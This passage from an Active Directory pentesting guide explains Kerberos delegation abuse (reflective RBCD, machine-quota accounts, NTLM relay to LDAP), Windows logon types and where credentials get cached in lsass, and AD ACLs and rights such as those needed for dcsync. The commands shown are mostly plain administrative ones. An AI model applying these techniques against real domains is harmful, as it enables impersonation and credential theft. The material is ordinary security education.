you probably can change the ticket service to use it to access to the LDAP
service.</p>
<p>
In order to impersonate a user to a service, you need Resource Based Constrained
Delegation (RBCD) or Classic Constrained Delegation with Protocol Transition
(S4U2self).</p>
<p>
You can enable RBCD to an account by being allowed to write in its
ms-AllowedToActOnBehalfOfOtherIdentity attribute and point to an account that
has at least one service (in order to use S4U2self).</p>
<p>
If you don't have an account that has at least one service, you can create one
computer account by abusing the <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#generic-dacl-abuse">machine quota</a> that allows users by default to
create until 10 machine accounts on the domain. This can be done with <a href="https://github.com/Kevin-Robertson/Powermad#machineaccountquota-functions">Powermad</a>
or <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py">impacket addcomputer.py</a>. Once the computer account is created (the user can
choose the password of the computer account), the user that created it can
assign services to it. Thus you can get a account with services.</p>
<p>
Moreover, the accounts by default has permissions to edit its own
ms-AllowedToActOnBehalfOfOtherIdentity attribute. So if you are able to get
credentials (like NT hash, Kerberos keys, or <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce">TGTs</a>) of a computer account, you can
enable RBCD to an arbitrary user to that computer. This way, you can use RBCD to
impersonate an administrator against the computer CIFS (SMB) service and
compromise the computer.</p>
<p>
Actually, since you have computer account credentials, you can enable RBCD to
itself (reflective RBCD). This way you just need to use <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#empowering-active-directory-objects-and-reflective-resource-based-constrained-delegation">S4U2self to ask for a
ticket for the computer CIFS service</a> in order to get a ST to compromise the
host. This even works to impersonate protected user accounts. In case you are
wondering, this method is required since domain computer accounts doesn't have
permissions by default to access remotely to the computer itself as
administrator.</p>
<figure>
<pre class="example">   .----------------------1) LDAP (modify websrv$) --------------------.                                                   
   |      + msds-AllowedToActOnBehalfOfOtherIdentity = ["websrv$"]     |
   |                                                                   v
   |     .----------------2) TGS-REQ---------------------------.      .---.
   ^     |              + SPN: CIFS/websrv                     |     /   /|
   o  &gt;--'              + For user: admin                      '--&gt; .---. |
  /|\                   + TGT websrv$                               |   | '
  / \                                                               |   |/ 
websrv$ &lt;-----------------3) TGS-REP------------------------------&lt; '---'  
   v                  + ST admin &gt; CIFS/websrv                       DC (KDC)
   |
   |                                        .---.
   |                                       /   /|
   '---------4) AP-REQ------------------&gt; .---. |
         + ST admin &gt; CIFS/websrv         |   | '
                                          |   |/ 
                                          '---'  
                                          websrv
</pre>
<figcaption>
Reflective RBCD attack
</figcaption>
</figure>
<p>
Notwithstanding, to acquire computer credentials before compromising the
machine can be tricky (maybe with <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce">Unconstrained Delegation</a>?), but in case you
can coerce to the computer to make an NTLM-authenticated HTTP request against a
host you control, you can use a cross <a href="#ntlm-relay">NTLM relay</a> attack from HTTP to LDAP in
order to enable RBCD for the computer account to an account that you control.</p>
<p>
To use this primitive you can <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#viable-ntlm-relay-primitives-for-rcelpe">take advantage of the WebDAV</a> client installed
by default in Windows desktops. For instance, you can trigger an authenticated
HTTP request by using the <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe">xp_dirtree procedure of a MSSQL database</a> (you can use 
<a href="https://gist.github.com/3xocyte/0dc0bd4cb48cc7b4075bdc90a1ccc7d3">bad_sequel.py</a> for this).</p>
<p>
However, it is possible that you compromise accounts with Classic Constrained
Delegation that hasn't Protocol Transition (S4U2self) enabled, so you are unable
to ask a ticket for any user. In this case, you could <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-accounts-collude---trustedtoauthfordelegation-who">use RBCD to mimic Protocol
Transition</a>. This means you can enable RBCD from the compromised account (the one
with Classic Constrained Delegation) to another account, so that other account
can ask a ticket for any user to the compromised account, that should be
<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#a-forwardable-result">forwardable since it is produced by S4U2proxy</a> (the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ce6bbf34-0f11-40d6-93d1-165a3afa0223?redirectedfrom=MSDN">specification has been
updated</a> but this fact seems to stay right), this way imitating Protocol
Transition.</p>
<p>
This could be a little tricky, so lets view an example were the dbsrv is
compromised and has Classic Constrained Delegation enabled but without Protocol
Transition. However, websrv is also compromised and can be used for RBCD
Protocol Transition. Then RBCD is enabled from websrv to dbsrv and websrv is
used to mimic protocol transition and finally get an admin ST to compromise
filesrv in the following way.</p>
<figure>
<pre class="example">                                        KDC
   .-------1) TGS-REQ--&gt;&gt;------------&gt; .---. &lt;----6) TGS-REQ----&lt;&lt;------------.  
   |    + SPN: HTTP/websrv            /   /| + SPN: CIFS/filesrv              |
   |    + For user: admin            .---. | + TGT dbsrv$                     |
   |    + TGT websrv$                |   | ' + ST(F) admin &gt; MSSQLSvc/dbsrv   |
   |                                 |   |/                                   |
   |  .----2) TGS-REP--&lt;&lt;----------&lt; '---' &gt;------7) TGS-REP----&gt;&gt;--------.   |             
   |  | + ST admin &gt; HTTP/websrv     ^   v   + ST admin &gt; CIFS/filesrv    |   |
   |  |                              |   |                                |   |
   |  |                              |   |                                |   |
   |  |                              |   |                                |   |
   ^  v                              |   |                                |   |
   .---. &gt;--------3) TGS-REQ----&gt;&gt;---'   |                                |   |
  /   /|  + SPN: MSSQLSvc/dbsrv          |                                |   |
 .---. |  + TGT websrv$                  |                                |   |
 |   | '  + ST admin &gt; HTTP/websrv       |                                |   |
 |   |/                                  |                                |   |
 '---' &lt;----------4) TGS-REP----&lt;&lt;-------'                                v   ^
 websrv  + ST(F) admin &gt; MSSQLSvc/dbsrv                                   .---. 
   v                                                                     /   /|  
   |                                                                    .---. | 
   '------------------5) Send the ticket-----&gt;&gt;&gt;&gt;---------------------&gt; |   | '                      
                    + ST(F) admin &gt; MSSQLSvc/dbsrv                      |   |/  
                                                                        '---'   
                                                                        dbsrv   
                                  .---.                                  v
                                 /   /|                                  |
                                .---. | &lt;--8) AP-REQ---&lt;&lt;----------------'
                                |   | '  + ST admin &gt; CIFS/filesrv
                                |   |/ 
                                '---'  
                                filesrv
</pre>
<figcaption>
Using RBCD as Protocol Transition
</figcaption>
</figure>
<p>
In the first four steps, websrv uses S4U2self and S4U2proxy for acquire a
forwardable MSSQLSvc/dbsrv ST for admin, thus mimicking Protocol Transition.
Then websrv sends this admin ST to dbsrv, that uses it for S4U2proxy and
request a CIFS/filesrv ST for admin, that allows to compromise filesrv. </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-logon-types" class="outline-3">
<h3 id="logon-types">
Logon types
</h3>
<div id="outline-text-logon-types" class="outline-text-3">
<p>
In order to logon users, both locally and remotely, Windows defines different
types of logons that is important to known as an attacker for a couple of
reasons. Firstly, not every logons can be used by any user, so you need to be
aware what you are allowed to do. Secondly, 
<a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">many logons cache credentials in the lsass process</a> , or even in the LSA secrets,
, that can be recover by a pentester, so is important to recognize which are
these logons.</p>
<div id="outline-container-interactive-logon" class="outline-4">
<h4 id="interactive-logon">
Interactive logon
</h4>
<div id="outline-text-interactive-logon" class="outline-text-4">
<p>
  The interactive logon or locally logon happens when there is a login in the
  physical machine, or when using <code class="verbatim">runas</code>. The credentials get cached in the
  lsass process of the machine.</p>
<figure>
<img src="./interactive_logon.png" alt="./interactive_logon.png" title="./interactive_logon.png"><figcaption>
Interactive logon
</figcaption>
</figure>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>runas /user:&lt;username&gt; cmd</span></span></code></pre></div>
</div>
<figcaption>
Interactive logon with runas
</figcaption>
</figure>
<p>
  In this type of logon, in case of local accounts, the computer checks the
  password by checking its NT hash against those stored in the SAM. If the user
  is using a domain account, the computer checks the user credentials by asking a
  Kerberos TGT to the Domain Controller that gets cached in the machine. In case
  the Domain Controller is not accessible, the computer checks the user
  credentials in the Domain cached credentials (DCC) storage that caches the
  credentials of the last <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/cached-domain-logon-information">domain users logged in the machine</a>. If the domain
  credentials are not cached, the computer is not able to authenticate the user.</p>
<p>
  Once the authentication is verified, the NT hash, derived from the password,
  is stored in the lsass process. For domain accounts, also Kerberos keys, also
  derived from the user password, and tickets are cached to provide SSO (Single
  Sign On). In older computers, even the plain password is cached.</p>
<p>
  In order to perform an Interactive logon, you may require the
  <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-locally">SeInteractiveLogonRight</a>, especially on Domain Controllers or other Windows
  Server machines.</p>
</div>
</div>
<div id="outline-container-network-logon" class="outline-4">
<h4 id="network-logon">
Network logon
</h4>
<div id="outline-text-network-logon" class="outline-text-4">
<p>
  The network logon happens when you connect to a remote machine
  using a non interactive service like SMB, RPC, SQL, etc. For this kind of
  logon you require the password, the NT hash or a Kerberos ticket, so they are
  susceptible of Pass-The-Hash, Pass-The-Key or Pass-The-Ticket attack. One
  important fact is that the <strong>credentials are not cached</strong> in the remote machine,
  except if Kerberos delegation is enabled. </p>
<p>
  This is probably the type of logon more commonly used by an attacker (I mean
  consciously, cause is also the most used by legitimate users since computers
  are connecting each other constantly in a domain).</p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">Psexec</a>, the <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> suite and Powershell remote (using WinRM with default
  login) use this kind of authentication even if they provide an interactive
  shell.</p>
</blockquote>
<p>
  Here are some examples of network logon:</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">dir</span> \\ws01-10\Temp</span></span></code></pre></div>
</div>
<figcaption>
Access to a share
</figcaption>
</figure>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>.\PsExec.exe \\dc01 cmd</span></span></code></pre></div>
</div>
<figcaption>
Execute PsExec
</figcaption>
</figure>
<p>
  In this type of logon, the client connects to a remote machine and uses <a href="#spnego">SPNEGO</a>
  to negotiate the authentication protocol, and finally uses <a href="#kerberos">Kerberos</a> or <a href="#ntlm">NTLM</a>.
  Since using any of these protocols the credentials of the user are not sent
  directly, they cannot be cached in the target machine. The exception is if
  <a href="#kerberos-delegation">Kerberos delegation</a> is enabled.</p>
<p>
  Be aware that even if you can perform a Network logon, there could many
  reasons why a service cannot be used. First one is that there is a firewall
  preventing for connections to the remote services, and the second one is that
  many of the services that are available through Network logon can be only
  being used for administrators.</p>
<p>
  For example, you may be able to use Network logon to access to some shares of
  a remote computer, but cannot launch a shell with PsExec since it needs access
  to the service Manager, which can only be accessed by administrators.</p>
</div>
</div>
<div id="outline-container-batch-logon" class="outline-4">
<h4 id="batch-logon">
Batch logon
</h4>
<div id="outline-text-batch-logon" class="outline-text-4">
<p>
  Used to running scheduled tasks in the context of an user. The
  Microsoft documentation indicates that the password of task user is stored in
  the LSA secrets, however I wasn't able to store the password there on my
  tests. Also the credentials will be cached in the lsass process when the task
  is executed.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>schtasks.exe /create /tn notepaddaily /tr notepad.exe /sc daily /ru CONTOSO\TaskUser /rp task1234!</span></span></code></pre></div>
</div>
<figcaption>
Task creation with user credentials
</figcaption>
</figure>
<p>
  Be aware that the batch logon will be produced when the task is executed,
  not when is created. So maybe you have privileges to run as a task (like
  <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-batch-job">SeBatchLogonRight</a>) but you cannot create a task. For example, Backup Operators
  have the SeBatchLogonRight but they cannot create tasks (by default).</p>
<p>
  When the task is launched the credentials are verified and cached as in the
  <a href="#interactive-logon">Interactive Logon</a>.</p>
</div>
</div>
<div id="outline-container-service-logon" class="outline-4">
<h4 id="service-logon">
Service logon
</h4>
<div id="outline-text-service-logon" class="outline-text-4">
<p>
  The service logon is used when a service is going to be launched in the
  context of an user. The plain password is stored in the LSA secrets of the
  machine and the credentials will be cached in the lsass process when the
  service is executed.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc.exe create MySvc2 binpath= c:\windows\system32\notepad.exe obj=CONTOSO.local\svcUser password=svc1234!</span></span></code></pre></div>
</div>
<figcaption>
Service creation with user credentials
</figcaption>
</figure>
<p>
  Be aware that the service logon will be produced when the service is executed,
  not when is created. So maybe you have privileges to logon as a service (like
  <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-service">SeServiceLogonRight</a>) but you cannot create a service.</p>
<p>
  When the service is launched the credentials are verified and cached as in the
  <a href="#interactive-logon">Interactive Logon</a>.</p>
</div>
</div>
<div id="outline-container-networkcleartext-logon" class="outline-4">
<h4 id="networkcleartext-logon">
NetworkCleartext logon
</h4>
<div id="outline-text-networkcleartext-logon" class="outline-text-4">
<p>
  In case of NetworkCleartext logon the password is
  sent over the network to the target machine (in an encrypted communication).
  This logon type is used by Powershell remoting when CredSSP authentication is
  specified.</p>
<blockquote>
<p>CredSSP performs a network authentication using NTLM or Kerberos and when a
  encrypted channel is created, then it send the password to the target machine. </p>
</blockquote>
<p>
  It should be noticed that credentials are cached in the target machine since
  they are sent in the communication.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>New-PSSession -Credential $(Get-Credential) -Authentication Credssp</span></span></code></pre></div>
</div>
<figcaption>
NetworkCleartext logon with Powershell remoting
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-newcredentials-logon" class="outline-4">
<h4 id="newcredentials-logon">
NewCredentials logon
</h4>
<div id="outline-text-newcredentials-logon" class="outline-text-4">
<p>
  The NewCredentials logon happens when using <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc771525(v=ws.11)">runas</a> with the <code class="verbatim">/netonly</code>. Then,
  the launched process will be use the credentials only for remote connections,
  keeping the current user session for local operations.</p>
<p>
  The credentials are cached in the local lsass process in order to be used for
  network connections. Then, when the process requires it, it can perform
  network logons to access remote resources of the domain.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>runas /netonly /user:CONTOSO\OtherUser cmd</span></span></code></pre></div>
</div>
<figcaption>
Perform a NewCredentials logon with runas
</figcaption>
</figure>
<p>
  The credentials are not checked until a network connection is done, but they
  are cached when the <code>runas</code> command is executed, just like in the
  <a href="#interactive-logon">Interactive Logon</a> (except for Kerberos tickets, since they are retrieved when
  the credentials are checked). You must take this into account since this
  method <strong>allows to cache fake credentials</strong> in the lsass process, and is
  sometimes <a href="https://securitywa.blogspot.com/2016/04/improve-detection-using-honeycreds.html">used by the blue team to create honey credentials</a> in order to detect
  attackers.</p>
</div>
</div>
<div id="outline-container-remoteinteractive-logon" class="outline-4">
<h4 id="remoteinteractive-logon">
RemoteInteractive logon
</h4>
<div id="outline-text-remoteinteractive-logon" class="outline-text-4">
<p>
  The RemoteInteractive logon is used when you connect to a machine over <a href="#RDP">RDP</a>.
  RDP uses <a href="#cred-ssp">CredSSP</a> for remote login so the password are sent over the network to
  the target machine and therefore credentials are cached in the remote lsass
  process.</p>
<figure>
<img src="./rdp_client.png" alt="./rdp_client.png" title="./rdp_client.png"><figcaption>
RemoteInteractive logon using RDP
</figcaption>
</figure>
<p>
  The authentication is similar to <a href="#network-logon">Network Logon</a>, but the credentials are sent
  to the target machine so they are cached as in the <a href="#interactive-logon">Interactive Logon.</a></p>
<p>
  To being able to log on a remote computer by using the RemoteInteractive
  logon your user need to be part of the <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-remotedesktopusers">Remote Desktop Users</a> or having the
  <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services">SeRemoteInteractiveLogonRight</a> right in the target machine.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-authorization" class="outline-2">
<h2 id="authorization">
Authorization
</h2>
<div id="outline-text-authorization" class="outline-text-2">
<p>
Once a client was able to resolve the target hostname and get authenticated,
the target service/program/computer should be now aware about its permissions,
that is, know the user username and SID, and the groups it belongs to. Once this
information is known, the program can decide if the user has enough privileges
to access to certain objects.</p>
<div id="outline-container-acls" class="outline-3">
<h3 id="acls">
ACLs
</h3>
<div id="outline-text-acls" class="outline-text-3">
<div id="outline-container-security-descriptor" class="outline-4">
<h4 id="security-descriptor">
Security descriptor
</h4>
<div id="outline-text-security-descriptor" class="outline-text-4">
<p>
But, how is it possible to check if the user has access to an object? By
checking its <a href="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm">security descriptor</a>. In Active Directory, each object of the
database has an associated <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors">security descriptor</a> in its <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-ntsecuritydescriptor">NTSecurityDescriptor</a>
property. The security descriptor is stored in a <a href="https://www.gabescode.com/active-directory/2019/07/25/nt-security-descriptors.html">binary format</a>, but it can also
be translated to a <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format">Security Descriptor String Format</a>.</p>
<p>
The security descriptor contains the following security information:</p>
<ul>
<li>SID of <strong>principal</strong> that is the object owner</li>
<li>SID of the owner <strong>primary group</strong></li>
<li>(Optional) <strong>DACL</strong> (Discretionary Access Control List)</li>
<li>(Optional) <strong>SACL</strong> (System Access Control List)</li>
</ul>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; $(Get-ADUser anakin -Properties nTSecurityDescriptor).nTSecurityDescriptor | select Owner,Gro
</span></span><span style="display:flex;"><span>up,Access,Audit | Format-List
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Owner  <span style="color:#960050;background-color:#1e0010">:</span> CONTOSO\Domain Admins
</span></span><span style="display:flex;"><span>Group  <span style="color:#960050;background-color:#1e0010">:</span> CONTOSO\Domain Admins
</span></span><span style="display:flex;"><span>Access <span style="color:#960050;background-color:#1e0010">:</span> {System.DirectoryServices.ActiveDirectoryAccessRule, System.DirectoryServices.ActiveDirectoryAccessRule,
</span></span><span style="display:flex;"><span>         System.DirectoryServices.ActiveDirectoryAccessRule, System.DirectoryServices.ActiveDirectoryAccessRule...}
</span></span><span style="display:flex;"><span>Audit  <span style="color:#960050;background-color:#1e0010">:</span></span></span></code></pre></div>
</div>
<figcaption>
Get security descriptor of user object
</figcaption>
</figure>
<p>
As you can see, there could be two ACL (Access Control List) in each security
descriptor: DACL and SACL. An ACL is a list of ACEs (Access Control Entry). The
ACEs of the SACL defines the access attempts that are going to <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/audit-generation">generate logs</a>,
and they can be useful from a defensive perspective.</p>
<p>
However, the most important part is the DACL, that is usually present in all the
objects, whose ACEs determines the users/groups that can access to the object,
and the type of access that is allowed. Usually when someone refers to the
object ACL, it means the DACL.</p>
</div>
</div>
<div id="outline-container-aces" class="outline-4">
<h4 id="aces">
ACEs
</h4>
<div id="outline-text-aces" class="outline-text-4">
<p>
Each <a href="http://web.archive.org/web/20150907161422/http://searchwindowsserver.techtarget.com/feature/The-structure-of-an-ACE">ACE has several parts</a>:</p>
<ul>
<li><strong>ACE type</strong>: Specifies if the ACE is for allowing or denying access (or
logging access in case of SACL).</li>
<li><strong>Inheritance</strong>: Indicates if the ACE is inherited.</li>
<li><strong>Principal/Identity</strong>: Indicates the principal (user/group) for which the
ACE is applied. The principal SID is stored.</li>
<li><strong>Rights</strong>: Indicates the type of access the ACE is applying.</li>
<li><strong>Object type</strong>: A <a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">GUID</a> that indicates an extended right, property, or child
object depending on the Access Mask flags. Is set to zero if not used.</li>
<li><strong>Inheritance type</strong>: The type of object class that can inherit the ACE from
this object.</li>
</ul>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator&gt; $(Get-ADUser anakin -Properties nTSecurityDescriptor).nTSecurityDescriptor.Access[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> GenericRead
</span></span><span style="display:flex;"><span>InheritanceType       <span style="color:#960050;background-color:#1e0010">:</span> None
</span></span><span style="display:flex;"><span>ObjectType            <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">00000000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">000000000000</span>
</span></span><span style="display:flex;"><span>InheritedObjectType   <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">00000000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">000000000000</span>
</span></span><span style="display:flex;"><span>ObjectFlags           <span style="color:#960050;background-color:#1e0010">:</span> None
</span></span><span style="display:flex;"><span>AccessControlType     <span style="color:#960050;background-color:#1e0010">:</span> Allow
</span></span><span style="display:flex;"><span>IdentityReference     <span style="color:#960050;background-color:#1e0010">:</span> NT AUTHORITY\SELF
</span></span><span style="display:flex;"><span>IsInherited           <span style="color:#960050;background-color:#1e0010">:</span> False
</span></span><span style="display:flex;"><span>InheritanceFlags      <span style="color:#960050;background-color:#1e0010">:</span> None
</span></span><span style="display:flex;"><span>PropagationFlags      <span style="color:#960050;background-color:#1e0010">:</span> None</span></span></code></pre></div>
</div>
<figcaption>
ACE of user account
</figcaption>
</figure>
<p>
Therefore, <strong>ACEs can be used to grant access, but also to restrict it</strong>. It should
be note that in case a principal is both allowed and denied access by different
ACEs, then the deny ACE has preference and the access is denied.</p>
<p>
On the other hand, <strong>ACEs can be inherit from parent objects</strong> of the database (OUs
and containers), and actually, most of the ACEs that apply to objects are
inherited. In case of a inherited access contradicts an explicit ACE (not
inherited), then the explicit ACE determines the access rule. Thus, the
precedence is the following for ACEs:</p>
<ol>
<li>Explicit deny ACE</li>
<li>Explicit allow ACE</li>
<li>Inherited deny ACE</li>
<li>Inherited allow ACE</li>
</ol>
<p>There is an special case that is not limited by ACEs, and is the object <strong>owner</strong>.
The <strong>owner has implicit permission to modify the ACEs</strong> of an object (WriteDacl
right).</p>
<p>
Moreover, it must be also taken into account that in case of the security
descriptor has no DACL (DACL set to NULL), everyone has any access to the
object. However if the security descriptor has an empty DACL (no ACEs in the
DACL), then no one has access to the object.</p>
</div>
</div>
<div id="outline-container-rights" class="outline-4">
<h4 id="rights">
Rights
</h4>
<div id="outline-text-rights" class="outline-text-4">
<p>
The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/990fb975-ab31-4bc1-8b75-5da132cd4584">following rights</a> can be specified in a ACE:</p>
<ul>
<li><strong>Delete</strong>: Delete the object.</li>
<li><strong>ReadControl</strong>: Read the security descriptor, except the SACL.</li>
<li><strong>WriteDacl</strong>: Modify the object DACL in the security descriptor.</li>
<li><strong>WriteOwner</strong>: Modify the object owner in the security descriptor.</li>
<li><strong>CreateChild</strong>: Create child objects. For containers.</li>
<li><strong>DeleteChild</strong>: Delete child object. For containers.</li>
<li><strong>ListContents</strong>: List child objects. For containers. The object is hidden from
user if this right nor ListObject are not granted.</li>
<li><strong>ReadProperty</strong>: Read the property or <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/177c0db5-fa12-4c31-b75a-473425ce9cca">property set</a> specified in object type.
If object type is zero, then all properties can be read. It does not allow to
read the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7c1cdf82-1ecc-4834-827e-d26ff95fb207">confidential properties</a>.</li>
<li><strong>WriteProperty</strong>: Modify the property specified in object type. If
object type is zero, then all properties can be modified.</li>
<li><strong>WritePropertyExtended</strong>: Execute a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/20504d60-43ec-458f-bc7a-754eb64446df">validated write</a>. Maybe the most interesting
<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/validated-writes">validated write</a> is the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-self-membership">Self-Membership</a> for groups, that allows to add your
current user to the group with the ACE. </li>
<li><strong>DeleteTree</strong>: Delete all the child objects with a delete-tree operation.</li>
<li><strong>ListObject</strong>: List the object. The object is hidden from user if this right
nor ListContents are not granted.</li>
<li><strong>ControlAccess</strong>: Special permission that can be interpreted in many different
ways, based on the object type. In case the object type is a GUID of a
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e6685d31-5d87-42d0-8a5f-e55d337f47cd">confidential property</a>, it gives permission to read it. If is the GUID of an
<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/extended-rights">extended right</a> registered in the database schema, then the right is given. In
case the object type is null (GUID is all zeros) then all the extended rights
are granted.</li>
</ul>
<p>There are also some generic rights that encompass several rights:</p>
<ul>
<li><strong>GenericRead</strong>: ReadControl, ListContents, ReadProperty (all),
ListObject.</li>
<li><strong>GenericWrite</strong>: ReadControl, WriteProperty (all),
WritePropertyExtended (all).</li>
<li><strong>GenericExecute</strong>: ReadControl, ListContents.</li>
<li><strong>GenericAll</strong>: Delete, WriteDacl, WriteOwner, CreateChild,
DeleteChild, DeleteTree, ControlAccess (all), GenericAll, GenericWrite.</li>
</ul>
<p>There are many <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/extended-rights">extended rights</a>, but here are ones of the most interesting:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password">User-Force-Change-Password</a>: Change the user password without knowing the
current password. For user objects. Do not confuse with <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password">User-Change-Password</a>
right, that requires to know the password to change it.</li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes">DS-Replication-Get-Changes</a>: To replicate the database data. For the domain
object. Required to perform dcsync.</li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all">DS-Replication-Get-Changes-All</a>: To replicate the database secret data. For the
domain object. Required to perform dcsync.</li>
</ul>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator\Downloads&gt; (Get-Acl <span style="color:#e6db74">'AD:\DC=contoso,DC=local'</span>).Access[<span style="color:#ae81ff">49</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> ExtendedRight
</span></span><span style="display:flex;"><span>InheritanceType       <span style="color:#960050;background-color:#1e0010">:</span> None
</span></span><span style="display:flex;"><span>ObjectType            <span style="color:#960050;background-color:#1e0010">:</span> 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
</span></span><span style="display:flex;"><span>InheritedObjectType   <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">00000000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">000000000000</span>
</span></span><span style="display:flex;"><span>ObjectFlags           <span style="color:#960050;background-color:#1e0010">:</span> ObjectAceTypePresent
</span></span><span style="display:flex;"><span>AccessControlType     <span style="color:#960050;background-color:#1e0010">:</span> Allow
</span></span><span style="display:flex;"><span>IdentityReference     <span style="color:#960050;background-color:#1e0010">:</span> CONTOSO\Domain Controllers
</span></span><span style="display:flex;"><span>IsInherited           <span style="color:#960050;background-color:#1e0010">:</span> False
</span></span><span style="display:flex;"><span>InheritanceFlags      <span style="color:#960050;background-color:#1e0010">:</span> None
</span></span><span style="display:flex;"><span>PropagationFlags      <span style="color:#960050;background-color:#1e0010">:</span> None</span></span></code></pre></div>
</div>
<figcaption>
